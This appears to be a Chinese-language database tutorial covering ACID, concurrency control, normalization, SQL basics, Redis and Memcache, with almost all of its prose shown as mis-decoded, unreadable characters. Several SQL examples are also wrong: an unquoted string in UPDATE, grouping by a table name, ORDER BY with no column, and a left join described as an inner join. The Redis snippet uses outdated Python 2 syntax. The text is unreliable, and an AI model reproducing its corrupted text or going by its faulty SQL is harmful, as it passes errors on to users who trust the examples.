ä¸€è‡´æ€§ï¼šåœ¨äº‹å‹™é–‹å§‹ä¹‹å‰å’Œäº‹å‹™çµæŸä»¥å¾Œï¼Œè³‡æ–™åº«çš„å®Œæ•´æ€§æ²’æœ‰è¢«ç ´å£ã€‚é€™è¡¨ç¤ºå¯«å…¥çš„è³‡æ–™å¿…é ˆå®Œå…¨ç¬¦åˆæ‰€æœ‰çš„é è¨­è¦å‰‡ï¼Œé€™åŒ…å«è³‡æ–™çš„ç²¾ç¢ºåº¦ã€ä¸²è¯æ€§ä»¥åŠå¾ŒçºŒè³‡æ–™åº«å¯ä»¥è‡ªç™¼æ€§åœ°å®Œæˆé å®šçš„å·¥ä½œ

éš”é›¢æ€§ï¼šè³‡æ–™åº«å…è¨±å¤šå€‹ä¸¦ç™¼äº‹å‹™åŒæ™‚å°é½Šæ•¸æ“šé€²è¡Œè®€å¯«å’Œä¿®æ”¹çš„èƒ½åŠ›ï¼Œéš”é›¢æ€§å¯ä»¥é˜²æ­¢å¤šå€‹äº‹å‹™ä¸¦ç™¼åŸ·è¡Œæ™‚ç”±æ–¼äº¤å‰åŸ·è¡Œè€Œå°è‡´æ•¸æ“šçš„ä¸ä¸€è‡´ã€‚äº‹å‹™éš”é›¢åˆ†ç‚ºä¸åŒç´šåˆ¥ï¼ŒåŒ…æ‹¬è®€æœªæäº¤ï¼ˆread uncommittedï¼‰ã€è®€æäº¤ï¼ˆread committedï¼‰ã€å¯é‡è¤‡è®€ï¼ˆrepeatable readï¼‰å’Œåºåˆ—åŒ–ï¼ˆserializableï¼‰

æŒä¹…æ€§ï¼šäº‹å‹™è™•ç†çµæŸå¾Œï¼Œå°è³‡æ–™æ•¸æ“šçš„ä¿®æ”¹å°±æ˜¯æ°¸ä¹…çš„ï¼Œå³ä¾¿ç³»çµ±æ•…éšœä¹Ÿä¸æœƒéºå¤±



è³‡æ–™åº«ä¸¦ç™¼æ§åˆ¶ï¼ˆConcurrency controlï¼‰ è³‡æ–™åº«ç®¡ç†ç³»çµ±ï¼ˆDBMSï¼‰ä¸­çš„ä¸¦ç™¼æ§åˆ¶çš„ä»»å‹™æ˜¯ç¢ºä¿åœ¨å¤šå€‹äº‹å‹™åŒæ™‚å­˜å–è³‡æ–™åº«ä¸­åŒä¸€æ•¸æ“šæ™‚ä¸ç ´å£äº‹å‹™çš„éš”é›¢æ€§ï¼ˆisolationï¼‰ä»¥åŠè³‡æ–™åº«çš„çµ±ä¸€æ€§ã€‚ä¸‹é¢èˆ‰ä¾‹èªªæ˜ä¸¦ç™¼æ“ä½œå¸¶ä¾†çš„æ•¸æ“šä¸ä¸€è‡´æ€§å•é¡Œï¼š
 ç¾æœ‰å…©è™•ç«è»Šç¥¨å”®ç¥¨é»ï¼ŒåŒæ™‚è®€å–æŸä¸€è¶Ÿåˆ—è»Šè»Šç¥¨è³‡æ–™åº«ä¸­è»Šç¥¨é¤˜é¡ç‚º Xã€‚å…©è™•å”®ç¥¨é»åŒæ™‚è³£å‡ºä¸€å¼µè»Šç¥¨ï¼ŒåŒæ™‚ä¿®æ”¹é¤˜é¡ç‚º X -1 å¯«å›è³‡æ–™åº«ï¼Œé€™æ¨£å°±é€ æˆäº†å¯¦éš›è³£å‡ºå…©å¼µç«è»Šç¥¨è€Œè³‡æ–™åº«ä¸­çš„è¨˜éŒ„å»åªå°‘äº†ä¸€å¼µã€‚
 ç”¢ç”Ÿé€™ç¨®æƒ…æ³çš„åŸå› æ˜¯å› ç‚ºå…©å€‹äº‹å‹™è®€å…¥åŒä¸€æ•¸æ“šä¸¦åŒæ™‚ä¿®æ”¹ï¼Œå…¶ä¸­ä¸€å€‹äº‹å‹™æäº¤çš„çµæœç ´å£äº†å¦ä¸€å€‹äº‹å‹™æäº¤çš„çµæœï¼Œå°è‡´å…¶æ•¸æ“šçš„ä¿®æ”¹éºå¤±ï¼Œç ´å£äº†äº‹å‹™çš„éš”é›¢æ€§ã€‚ä¸¦ç™¼æ§åˆ¶è¦è§£æ±ºçš„å°±æ˜¯é€™é¡å•é¡Œã€‚
 ä¸€èˆ¬ä¾†èªªæˆ‘å€‘æœƒä½¿ç”¨ä»¥ä¸‹å¹¾ç¨®æ–¹å¼ä¾†è§£æ±ºï¼š

å°é–  å°é–ï¼ˆlockï¼‰æ˜¯ä¸€é …ç”¨æ–¼å¤šç”¨æˆ¶åŒæ™‚å­˜å–è³‡æ–™åº«çš„æŠ€è¡“ï¼Œæ˜¯å¯¦ä½œä¸¦è¡Œæ§åˆ¶çš„ä¸€é …é‡è¦æ‰‹æ®µï¼Œèƒ½å¤ é˜²æ­¢ç•¶å¤šç”¨æˆ¶è¦†å¯«è³‡æ–™åº«æ™‚é€ æˆè³‡æ–™éºå¤±å’Œæå£ã€‚ç•¶æœ‰ä¸€å€‹ç”¨æˆ¶å°è³‡æ–™åº«å…§çš„è³‡æ–™é€²è¡Œæ“ä½œæ™‚ï¼Œåœ¨è®€å–è³‡æ–™å‰å…ˆé–ä½è³‡æ–™ï¼Œé€™æ¨£å…¶ä»–ç”¨æˆ¶å°±ç„¡æ³•å­˜å–å’Œä¿®æ”¹è©²è³‡æ–™ï¼Œç›´åˆ°é€™ä¸€è³‡æ–™ä¿®æ”¹ä¸¦å¯«å›è³‡æ–™åº«è§£é™¤å°é–ç‚ºæ­¢ã€‚

æ™‚é–“æˆ³  æ™‚é–“æˆ³ï¼ˆTimestampï¼‰ç”¨æ–¼è¾¨è­˜è¨˜éŒ„ä¸‹ä¾†çš„æ™‚é–“æ—¥æœŸçš„å­—ä¸²ã€‚åœ‹éš›æ¨™æº–ç‚º ISO 8601
  2005-10-30 T 10:45 UTC2007-11-09 T 11:20 UTC Sat Jul 23 02:16:57 2005

æ¨‚è§€ä¸¦ç™¼æ§åˆ¶  æ¨‚è§€ä¸¦è¡Œæ§åˆ¶ï¼ˆåˆç¨±ã€Œæ¨‚è§€é–ã€ï¼ŒOptimistic Concurrency Controlï¼Œç°¡ç¨± OCC ï¼‰æ˜¯ä¸€ç¨®ä¸¦è¡Œæ§åˆ¶çš„æ–¹æ³•ã€‚å®ƒå‡è¨­å¤šç”¨æˆ¶ä¸¦è¡Œçš„äº¤æ˜“åœ¨è™•ç†æ™‚ä¸æœƒå½¼æ­¤äº’ç›¸å½±éŸ¿ï¼Œå„äº¤æ˜“èƒ½å¤ åœ¨ä¸ç”¢ç”Ÿé–çš„æƒ…æ³ä¸‹è™•ç†å„è‡ªå½±éŸ¿çš„é‚£éƒ¨åˆ†è³‡æ–™ã€‚åœ¨æäº¤è³‡æ–™æ›´æ–°ä¹‹å‰ï¼Œæ¯å€‹äº¤æ˜“æœƒå…ˆæª¢æŸ¥åœ¨è©²äº¤æ˜“è®€å–è³‡æ–™å¾Œï¼Œæœ‰æ²’æœ‰å…¶ä»–äº¤æ˜“åˆä¿®æ”¹äº†è©²è³‡æ–™ã€‚å¦‚æœå…¶ä»–äº¤æ˜“æœ‰æ›´æ–°çš„è©±ï¼Œæ­£åœ¨æäº¤çš„äº¤æ˜“æœƒé€²è¡Œå›å¾©
  è®€å–ï¼šäº¤æ˜“å°‡è³‡æ–™è®€å…¥å¿«å–ï¼Œé€™æ™‚ç³»çµ±æœƒçµ¦äº¤æ˜“åˆ†æ´¾ä¸€å€‹æ™‚é–“æˆ³  æ ¡é©—ï¼šäº¤æ˜“åŸ·è¡Œå®Œç•¢å¾Œï¼Œé€²è¡Œæäº¤ã€‚é€™æ™‚åŒæ­¥æ ¡é©—æ‰€æœ‰äº¤æ˜“ï¼Œå¦‚æœäº¤æ˜“æ‰€è®€å–çš„è³‡æ–™åœ¨è®€å–ä¹‹å¾Œåˆè¢«å…¶ä»–äº¤æ˜“ä¿®æ”¹ï¼Œå‰‡ç”¢ç”Ÿè¡çªï¼Œäº¤æ˜“è¢«ä¸­æ–·å›å¾©  å¯«å…¥ï¼šé€šéæ ¡é©—éšæ®µå¾Œï¼Œå°‡æ›´æ–°çš„è³‡æ–™å¯«å…¥è³‡æ–™åº«

æ‚²è§€ä¸¦ç™¼æ§åˆ¶  æ‚²è§€ä¸¦è¡Œæ§åˆ¶ï¼ˆåˆç¨±ã€Œæ‚²è§€é–ã€ï¼ŒPessimistic Concurrency Controlï¼Œç°¡ç¨± PCC ï¼‰æ˜¯ä¸€ç¨®ä¸¦è¡Œæ§åˆ¶çš„æ–¹æ³•ã€‚å®ƒå¯ä»¥é˜»æ­¢ä¸€å€‹äº¤æ˜“ä»¥å½±éŸ¿å…¶ä»–ç”¨æˆ¶çš„æ–¹å¼ä¾†ä¿®æ”¹è³‡æ–™ã€‚å¦‚æœä¸€å€‹äº¤æ˜“åŸ·è¡Œçš„æ“ä½œè®€æŸè¡Œè³‡æ–™æ‡‰ç”¨äº†é–ï¼Œé‚£åªæœ‰ç•¶é€™å€‹äº¤æ˜“æŠŠé–é‡‹æ”¾ï¼Œå…¶ä»–äº¤æ˜“æ‰èƒ½å¤ åŸ·è¡Œèˆ‡è©²é–è¡çªçš„æ“ä½œã€‚æ‚²è§€ä¸¦è¡Œæ§åˆ¶ä¸»è¦ç”¨æ–¼è³‡æ–™çˆ­ç”¨æ¿€çƒˆçš„ç’°å¢ƒï¼Œä»¥åŠç™¼ç”Ÿä¸¦ç™¼è¡çªæ™‚ä½¿ç”¨é–ä¿è­·è³‡æ–™çš„æˆæœ¬è¦ä½æ–¼å›å¾©äº¤æ˜“çš„æˆæœ¬çš„ç’°å¢ƒä¸­ã€‚



ä»€éº¼æ˜¯æ­£è¦åŒ–ï¼Ÿ æ­£è¦åŒ–æ˜¯åœ¨è³‡æ–™åº«ä¸­çµ„ç¹”è³‡æ–™ä¸€ç³»åˆ—åŸç†å’ŒæŠ€è¡“ã€‚å…¶ä¸­åŒ…æ‹¬å»ºç«‹è³‡æ–™è¡¨ï¼Œä»¥åŠåœ¨é€™äº›è³‡æ–™è¡¨ä¹‹é–“æ ¹æ“šè¦å‰‡å»ºç«‹é—œè¯æ€§ï¼Œé€™äº›è¦å‰‡çš„è¨­è¨ˆç›®çš„æ˜¯ï¼šé€éåˆªé™¤é‡è¤‡æ€§å’Œä¸ä¸€è‡´çš„ç›¸ä¾æ€§ï¼Œä¿è­·è³‡æ–™ä¸¦è®“è³‡æ–™åº«æ›´æœ‰å½ˆæ€§ã€‚ 

ç¬¬ä¸€æ­£è¦åŒ– ç¬¬ä¸€æ­£è¦åŒ–æ˜¯è³‡æ–™åº«æ­£è¦åŒ–ä¸­æ‰€ä½¿ç”¨çš„ä¸€ç¨®æ­£è¦å½¢å¼ã€‚ç¬¬ä¸€æ­£è¦åŒ–æ˜¯ç‚ºäº†è¦æ’é™¤é‡è¤‡ç¾¤ çš„å‡ºç¾ï¼Œæ‰€æ¡ç”¨çš„æ–¹æ³•æ˜¯è¦æ±‚è³‡æ–™åº«çš„æ¯å€‹åˆ—çš„å€¼åŸŸéƒ½æ˜¯ç”±åŸå­å€¼çµ„æˆï¼›æ¯å€‹æ¬„ä½çš„å€¼éƒ½åªèƒ½æ˜¯å–®ä¸€å€¼ã€‚

ç¬¬äºŒæ­£è¦åŒ– ç¬¦åˆç¬¬ä¸€æ­£è¦åŒ–ã€‚æ‰€æœ‰ééµçš„æ¬„ä½éƒ½ä¸€å®šæ˜¯å€™é¸éµå…¨é«”æ¬„ä½çš„å‡½å¼ã€‚

ç¬¬ä¸‰æ­£è¦åŒ– æ˜¯è³‡æ–™åº«æ­£è¦åŒ–ä¸­æ‰€ä½¿ç”¨çš„ä¸€ç¨®æ­£è¦å½¢å¼ï¼Œè¦æ±‚æ‰€æœ‰ééµå±¬æ€§éƒ½åªå’Œå€™é¸éµæœ‰ç›¸é—œæ€§ï¼Œä¹Ÿå°±æ˜¯èªªééµå±¬æ€§ä¹‹é–“æ‡‰è©²æ˜¯ç¨ç«‹ç„¡é—œçš„ã€‚


 ç¾åœ¨è³‡æ–™åº«è¨­è¨ˆæœ€å¤šæ»¿è¶³ 3NFï¼Œæ™®éèªç‚ºæ­£è¦åŒ–éé«˜ï¼Œé›–ç„¶å…·æœ‰å°è³‡æ–™é—œä¿‚æ›´å¥½çš„ç´„æŸæ€§ï¼Œä½†ä¹Ÿå°è‡´è³‡æ–™é—œä¿‚è¡¨å¢åŠ è€Œä»¤è³‡æ–™åº« IO æ›´æ˜“ç¹å¿™ï¼ŒåŸä¾†äº¤ç”±è³‡æ–™åº«è™•ç†çš„é—œä¿‚ç´„æŸç¾æ›´å¤šåœ¨è³‡æ–™åº«ä½¿ç”¨ç¨‹å¼ä¸­å®Œæˆã€‚


RDB vs. NoSQL 
ä¸€èˆ¬è€Œè¨€ï¼Œè³‡æ–™åº«ä¸»è¦æœ‰åˆ†ç‚ºé—œè¯å¼è³‡æ–™åº«ï¼ˆRDBï¼‰å’Œ NoSQLï¼ˆNot Only SQL &#x2F; nonrelationalï¼‰è³‡æ–™åº«ï¼Œé—œè¯å¼è³‡æ–™åº«æ˜¯ç”±ä¸€å †è³‡æ–™è¡¨çµ„æˆï¼Œæ¯å€‹è³‡æ–™è¡¨æœƒå°ç…§ä¸€å€‹å›ºå®šçš„è³‡æ–™è¡¨çµæ§‹ï¼ˆschemaï¼‰ã€‚ä¸€èˆ¬æœƒä½¿ç”¨ SQLï¼ˆStructured Query Languageï¼‰é€™ç¨®å®£å‘Šå¼èªè¨€ä¾†æ“ä½œæ•¸æ“šè³‡æ–™ï¼Œä¾‹å¦‚ï¼šMySQLã€PostgreSQLã€Oracleã€MSSQLã€SQLiteã€‚ç›¸å°æ–¼é—œè¯å¼è³‡æ–™åº«ï¼ŒNoSQL ä¸¦ä¸æ˜¯ä½¿ç”¨è³‡æ–™è¡¨ä¾†ä¿å­˜è³‡æ–™ï¼Œä¾‹å¦‚ï¼šMongoDB å°±æ˜¯ä¸€ç¨®å¾ˆæµè¡Œçš„æ–‡ä»¶å‹æ…‹ NoSQL è³‡æ–™åº«ï¼Œå…¶å…ƒç´ ä¸¦éä¸€åˆ—åˆ—æ•¸æ“šï¼Œè€Œæ˜¯ä½¿ç”¨é¡ JSON æ–‡ä»¶ï¼ˆdocumentï¼‰æ ¼å¼å‘ˆç¾ï¼Œæ›´å®¹æ˜“å»¶å±•æ“´å……å’Œæ›´æœ‰æ•ˆç‡ã€‚æ­¤å¤–é‚„æœ‰é‡å°ä¸åŒéœ€æ±‚è¨­è¨ˆçš„è³‡æ–™åº«ï¼Œä¾‹å¦‚ï¼šæ¬„è³‡æ–™åº«ã€åœ–å½¢ï¼ˆGraphï¼‰è³‡æ–™åº«ç­‰ã€‚æœ¬ç¯‡æ–‡ç« æœƒä¸»è¦è¨è«–é—œè¯å¼è³‡æ–™åº«ä¸¦è£œå……ä¸€äº› NoSQL çŸ¥è­˜é»ã€‚
SQLé¦–å…ˆï¼Œæˆ‘å€‘å…ˆä¾†ä»‹ç´¹å¦‚ä½•ä½¿ç”¨ SQL ä¾†æ“ä½œé—œè¯å¼è³‡æ–™åº«ï¼ï¼ˆæ³¨æ„ SQL èªæ³•å¯ä»¥å¤§å¯«æˆ–å°å¯«ï¼Œä½†å¯¦å‹™ä¸Šé€šå¸¸å¯«å¤§å¯«ã€‚ï¼‰
RDB è³‡æ–™åº«ç›¸é—œå‘½åæ–¹å¼ï¼ˆä¸»è¦ä¾åœ˜éšŠå…±è­˜ï¼‰ï¼š

è³‡æ–™åº«ï¼šåº•ç·šé€£æ¥ 
è³‡æ–™è¡¨ï¼šè¤‡æ•¸ã€åº•ç·šé€£æ¥ 
è³‡æ–™æ¬„ä½ï¼šå–®æ•¸ã€åº•ç·šé€£æ¥

NoSQL è³‡æ–™åº«ç›¸é—œå‘½åæ–¹å¼ï¼ˆä¸»è¦ä¾åœ˜éšŠå…±è­˜ï¼‰ï¼š

è³‡æ–™åº«ï¼šPascal casing (a.k.a. upper camel case)
è³‡æ–™è¡¨ï¼šå–®æ•¸ï¼ŒSchema name for tables prefix (E.g.: SchemeName.TableName) 
è³‡æ–™æ¬„ä½ï¼šå–®æ•¸ï¼ŒSchema name for tables prefix (E.g.: SchemeName.TableName)

æŒ‰ï¼šMicrosoft çš„å‘½åæ–¹å¼å–œæ­¡å–®å­—ç¬¬ä¸€å€‹å­—æ¯å¤§å¯«ï¼Œå¦‚ OrderDetailã€‚è€Œ MySQL æ¯”è¼ƒå¸¸è¦‹å…¨éƒ¨å°å¯«ï¼Œå–®å­—ä¸­é–“åŠ åº•ç·šçš„å‘½åæ–¹å¼ï¼Œå¦‚ birth_dateã€‚é€™å’Œè³‡æ–™åº«çš„å­—å…ƒå¤§å°å¯«æ•æ„Ÿåº¦é è¨­å€¼æœ‰é—œï¼ŒMS SQL Server é è¨­æ˜¯å¤§å°å¯«ä¸åˆ†ï¼ŒMySQL å‰‡æ˜¯å¤§å°å¯«è¦–ç‚ºä¸åŒæ¬„ä½ï¼Œæ‰€ä»¥çµ±ä¸€å°å¯«æ¯”è¼ƒä¸å®¹æ˜“å‡ºéŒ¯ã€‚
 

è³‡æ–™åº«&#x2F;è³‡æ–™è¡¨å‰µå»ºï¼ˆCREATEï¼‰ è¡¨æ ¼è¢«åˆ†ç‚ºæ¬„ä½ (column) åŠåˆ—ä½ (row)ã€‚æ¯ä¸€åˆ—ä»£è¡¨ä¸€ç­†è³‡æ–™ï¼Œè€Œæ¯ä¸€æ¬„ä»£è¡¨ä¸€ç­†è³‡æ–™çš„ä¸€éƒ¨ä»½ã€‚ç•¶æˆ‘å€‘å°è¡¨æ ¼ä¸‹å®šç¾©æ™‚ï¼Œæˆ‘å€‘éœ€è¦è¨»æ˜æ¬„ä½çš„æ¨™é¡Œï¼Œä»¥åŠé‚£å€‹æ¬„ä½çš„è³‡æ–™ç¨®é¡ã€‚
 ä½¿ç”¨ CREATE DATABASE æŒ‡ä»¤å¯ä»¥å»ºç«‹è³‡æ–™åº«ï¼Œå‘½åä½¿ç”¨å°å¯«è‹±æ–‡ä»¥åŠä¸‹åº•ç·šçµ„ï¼š
 CREATE DATABASE database_name;

 å¯¦éš›ä½¿ç”¨ï¼Œå»ºç«‹ä¸€å€‹åç‚º dr_course çš„è³‡æ–™åº«ï¼š
 CREATE DATABASE dr_course;

 ä½¿ç”¨ CREATE TABLE æŒ‡ä»¤å¯ä»¥å»ºç«‹è³‡æ–™è¡¨ï¼Œå‘½åä½¿ç”¨å¤§å¯«è‹±æ–‡ä»¥åŠï¼š
 CREATE TABLE &quot;è¡¨æ ¼å&quot;(&quot;æ¬„ä½ 1&quot; &quot;æ¬„ä½ 1 è³‡æ–™ç¨®é¡&quot;,&quot;æ¬„ä½ 2&quot; &quot;æ¬„ä½ 2 è³‡æ–™ç¨®é¡&quot;,... );

 å¯¦éš›ä½¿ç”¨ï¼Œå»ºç«‹ä¸€å€‹åç‚º users çš„è³‡æ–™è¡¨ï¼š
 CREATE TABLE users(id BIGINT(7) NOT NULL AUTO_INCREMENT,name CHAR(50),email CHAR(50),age INT(50),course_id INT(50),salary INT(50));

 å¯¦éš›ä½¿ç”¨ï¼Œå»ºç«‹ä¸€å€‹åç‚º courses è³‡æ–™è¡¨ï¼š
 CREATE TABLE courses(id BIGINT(7) NOT NULL AUTO_INCREMENT,name CHAR(50),point INT(50));

æ–°å¢ï¼ˆINSERTï¼‰
 ä½¿ç”¨ INSERT INTO æŒ‡ä»¤å¯ä»¥æ–°å¢è³‡æ–™ï¼š
 INSERT INTO &quot;è¡¨æ ¼å&quot; (&quot;æ¬„ä½1&quot;, &quot;æ¬„ä½2&quot;, ...) VALUES (&quot;å€¼1&quot;, &quot;å€¼2&quot;, ...);

 å¯¦éš›ä½¿ç”¨ï¼š
 INSERT INTO users (&quot;name&quot;, &quot;email&quot;, &quot;age&quot;, &quot;salary&quot;) VALUES (&quot;Mark&quot;, &quot;mark@gmail.com&quot;, 20, 70000);

é¸æ“‡ï¼ˆSELECTï¼‰
 ä½¿ç”¨ SELECT æŒ‡ä»¤å¯ä»¥é¸å–è³‡æ–™ï¼š
 SELECT &quot;æ¬„ä½&quot; FROM &quot;è¡¨æ ¼å&quot;;

 å¯¦éš›ä½¿ç”¨ï¼š
 SELECT name, email FROM users;

åˆªé™¤ï¼ˆDELETEï¼‰
 ä½¿ç”¨ DELETE æŒ‡ä»¤å¯ä»¥æ–°å¢è³‡æ–™ï¼š
 DELETE FROM &quot;è¡¨æ ¼å&quot; WHERE &quot;æ¢ä»¶&quot;;

 å¯¦éš›ä½¿ç”¨ï¼š
 DELETE FROM users WHERE id=1;
ä¿®æ”¹ï¼ˆUPDATEï¼‰
 ä½¿ç”¨ UPDATE SET æŒ‡ä»¤å¯ä»¥æ–°å¢è³‡æ–™ï¼š
 UPDATE &quot;è¡¨æ ¼å&quot; SET &quot;æ¬„ä½1&quot;=[æ–°å€¼] WHERE &quot;æ¢ä»¶&quot;;

 å¯¦éš›ä½¿ç”¨ï¼š
 UPDATE users SET name=Mark WHERE id=1;

åˆ†çµ„æ ¹æ“šï¼ˆGROUP BYï¼‰
 ä½¿ç”¨ INSERT INTO æŒ‡ä»¤å¯ä»¥æ–°å¢è³‡æ–™ï¼š
 SELECT &quot;æ¬„ä½1&quot;, SUM(&quot;æ¬„ä½2&quot;) FROM &quot;è¡¨æ ¼å&quot; GROUP BY &quot;æ¬„ä½1&quot;;

 å¯¦éš›ä½¿ç”¨ï¼š
 SELECT name, SUM(salary) FROM users GROUP BY users;

æ’åºæ ¹æ“šï¼ˆORDER BYï¼‰
 é€šå¸¸æˆ‘å€‘æœƒéœ€è¦å°‡è³‡æ–™åšæ’åºï¼Œæ­¤æ™‚å¯ä»¥ä½¿ç”¨ ORDER BY æŒ‡ä»¤å¯ä»¥é€²è¡Œè³‡æ–™æ’åºï¼ˆ[] ä»£è¡¨å¯é¸ï¼ŒASC å’Œ DESC æ˜¯ ascending å’Œ descending çš„ç¸®å¯«ï¼Œdefault ä½¿ç”¨ ASCï¼‰ï¼š
 SELECT &quot;æ¬„ä½å&quot; FROM &quot;è¡¨æ ¼å&quot; [WHERE &quot;æ¢ä»¶&quot;]ORDER BY &quot;æ¬„ä½å&quot; [ASC, DESC];

 å¯¦éš›ä½¿ç”¨ï¼š
 SELECT * FROM users ORDER BY ASC;

è¯çµï¼ˆJOINï¼‰
 æˆ‘å€‘ç¾åœ¨æœ‰å…©å€‹è³‡æ–™è¡¨å–®ä¸€å€‹æ˜¯ users ä¸€å€‹æ˜¯ courses ï¼Œä¸€å€‹å­˜æ”¾ä½¿ç”¨è€…çš„è³‡æ–™è¡¨ï¼Œä¸€å€‹å­˜æ”¾èª²ç¨‹è³‡æ–™è¡¨ã€‚æˆ‘å€‘å¸Œæœ›è¨ˆç®—ä½¿ç”¨è€…ä¿®äº†å¤šå°‘å­¸åˆ†çš„èª²ï¼Œæ‰€ä»¥é€é course_id ä¾†é€£çµå…©å€‹è¡¨å–®ï¼š
 SELECT A1.name, SUM(A2.point)  FROM users A1, courses A2 WHERE A1.course_id = A2.id GROUP BY A1.course_id;

 ä¹‹å‰æˆ‘å€‘çœ‹åˆ°çš„å·¦é€£æ¥ (left join)ï¼Œåˆç¨±å…§éƒ¨é€£æ¥ (inner join)ã€‚åœ¨é€™å€‹æƒ…æ³ä¸‹ï¼Œè¦å…©å€‹è¡¨æ ¼å…§éƒ½æœ‰åŒæ¨£çš„å€¼ï¼Œé‚£ä¸€ç­†è³‡æ–™æ‰æœƒè¢«é¸å‡ºã€‚é‚£å¦‚æœæˆ‘å€‘æƒ³è¦åˆ—å‡ºä¸€å€‹è¡¨æ ¼ä¸­æ¯ä¸€ç­†çš„è³‡æ–™ï¼Œç„¡è«–å®ƒçš„å€¼åœ¨å¦ä¸€å€‹è¡¨æ ¼ä¸­æœ‰æ²’æœ‰å‡ºç¾ï¼Œæˆ‘å€‘å°±éœ€è¦ç”¨åˆ° SQL OUTER JOIN (å¤–éƒ¨é€£æ¥) çš„æŒ‡ä»¤ï¼š
 SELECT A1.name, SUM(A2.point) SALES FROM users A1, courses A2 WHERE A1.course_id = A2.id (+) // åœ¨ Oracle è³‡æ–™åº«è¦ä½¿ç”¨ + GROUP BY A1.course_id;

ä¸é‡è¤‡è³‡æ–™ï¼ˆDISTINCTï¼‰
 ä½¿ç”¨ DISTINCT æŒ‡ä»¤å¯ä»¥é¸æ“‡ä¸é‡è¤‡è³‡æ–™ï¼š
 SELECT DISTINCT &quot;æ¬„ä½&quot; FROM &quot;è¡¨æ ¼å&quot;;

 å¯¦éš›ä½¿ç”¨ï¼š
 SELECT DISTINCT name FROM users;

å­æŸ¥è©¢åœ¨ SQL ä¸­å¯ä»¥å°‡æŸ¥è©¢çµæœç•¶åšä¸€å€‹è³‡æ–™è¡¨ï¼Œå†æ¬¡é€²è¡Œ SELECT æŸ¥è©¢ï¼š
SELECT MIN(id) AS min_user_id FROM (SELECT id FROM users WHERE age = 20); 

ç´¢å¼•å»ºè­°è³‡æ–™è¡¨ä¸­å¸¸ç”¨ä¾†æŸ¥è©¢çš„æ¬„ä½ä½¿ç”¨ index ç´¢å¼•å¯ä»¥åœ¨ä½¿ç”¨ JOIN æ™‚æé«˜æª¢ç´¢æ•ˆç‡ï¼Œè³‡æ–™è¡¨ä¸­å¯ä»¥æœ‰ä¸€å€‹æˆ–å¤šå€‹ç´¢å¼•ï¼Œä¹Ÿå¯ä»¥æŠŠæŸå€‹ç´¢å¼•æ¬„ä½è¨­ç‚º uniqueã€‚
æŸ¥è©¢æœ€ä½³åŒ–ä¸€èˆ¬è€Œè¨€ï¼Œå…ˆç¯©é¸å† JOIN æ•ˆèƒ½æœƒæ¯”è¼ƒå¥½ã€‚ä½†ä¸€èˆ¬è³‡æ–™åº«å¼•æ“æœƒå¹«ä½ æœ€ä½³åŒ–ï¼Œæ‰€ä»¥åªè¦ä¸‹ SQL å°±å¥½ï¼š
SELECT name FROM users JOIN courses ON users.course_id = courses.id WHERE courses.point &gt; 2;

ORMç‰©ä»¶é—œè¯å°æ˜ ï¼ˆè‹±èªï¼šObject Relational Mappingï¼Œç°¡ç¨±ORMï¼Œæˆ–O&#x2F;RMï¼Œæˆ–O&#x2F;R mappingï¼‰ï¼Œæ˜¯ä¸€ç¨®ç¨‹å¼è¨­è¨ˆæŠ€è¡“ï¼Œç”¨æ–¼å¯¦ç¾ç‰©ä»¶å°å‘ç·¨ç¨‹èªè¨€è£¡ä¸åŒé¡å‹ç³»çµ±çš„è³‡æ–™ä¹‹é–“çš„è½‰æ›ã€‚
MongoDBMongoDB æ˜¯ä¸€å€‹é–‹æºä¸”è·¨å¹³å°çš„ NoSQL è³‡æ–™åº«ï¼Œä¸»è¦ä½¿ç”¨é¡ JSON æ ¼å¼çš„æ–‡ä»¶é€²è¡Œè³‡æ–™å„²å­˜å’Œ schema å®šç¾©ã€‚
 
RedisRedis æ˜¯ä¸€å€‹éå¸¸æµè¡Œçš„é–‹æºã€æ”¯æ´ç¶²è·¯ã€åŸºæ–¼è¨˜æ†¶é«”ã€éµå€¼å°å„²å­˜è³‡æ–™åº«ï¼Œä½¿ç”¨ ANSI C ç·¨å¯«è€Œæˆã€‚
#coding:utf-8import redis# lredis-server ä¿æŒé–‹å•Ÿï¼Œè‹¥æ˜¯æœ‰ä½¿ç”¨å¯†ç¢¼ï¼Œå‰‡è¦åœ¨ ConnectionPool ä½¿ç”¨ password=å¯†ç¢¼pool = redis.ConnectionPool(host=&#x27;127.0.0.1&#x27;, port=6379, db=0)r=redis.StrictRedis(connection_pool=pool)# å­—ç¬¦ä¸² stringr.set(&#x27;test&#x27;,&#x27;aaa&#x27;)print r.get(&#x27;test&#x27;);# åˆ—è¡¨ list# æ³¨æ„ pythonã€lrange range ç¯„åœx=0for x in range(0,11):	r.lpush(&#x27;list&#x27;,x)	x=x+1print r.lrange(&#x27;list&#x27;,&#x27;0&#x27;,&#x27;10&#x27;)# hash/dict dict_hash=&#123;&#x27;name&#x27;:&#x27;tang&#x27;,&#x27;password&#x27;:&#x27;tang_passwd&#x27;&#125;r.hmset (&#x27;hash_test&#x27;,dict_hash)print r.hgetall(&#x27;hash_test&#x27;)# é›†åˆ setr.sadd(&#x27;set_test&#x27;,&#x27;aaa&#x27;,&#x27;bbb&#x27;)r.sadd(&#x27;set_test&#x27;,&#x27;ccc&#x27;)r.sadd(&#x27;set_test&#x27;,&#x27;ddd&#x27;)print r.smembers(&#x27;set_test&#x27;)# æœ‰åºé›†r.zadd(&#x27;zset_test&#x27;,&#x27;aaa&#x27;,1,&#x27;bbb&#x27;,1)r.zadd(&#x27;zset_test&#x27;,&#x27;ccc&#x27;,1)r.zadd(&#x27;zset_test&#x27;,&#x27;ddd&#x27;,1)print r.zrange(&#x27;zset_test&#x27;,0,10)

MemcacheMemcache æ˜¯ä¸€å¥—é–‹æºçš„åˆ†æ•£å¼çš„å¿«å–ç³»çµ±ï¼Œæ˜¯ç”± LiveJournal çš„ Brad Fitzpatrick æ‰€é–‹ç™¼ã€‚ç”±æ–¼ä¸€èˆ¬èªç‚º Memcache ç¼ºä¹èªè­‰ä»¥åŠå®‰å…¨ç®¡åˆ¶ï¼Œå› æ­¤æ‡‰è©²å°‡ Memcache ä¼ºæœå™¨æ”¾ç½®åœ¨é˜²ç«ç‰†å¾Œã€‚
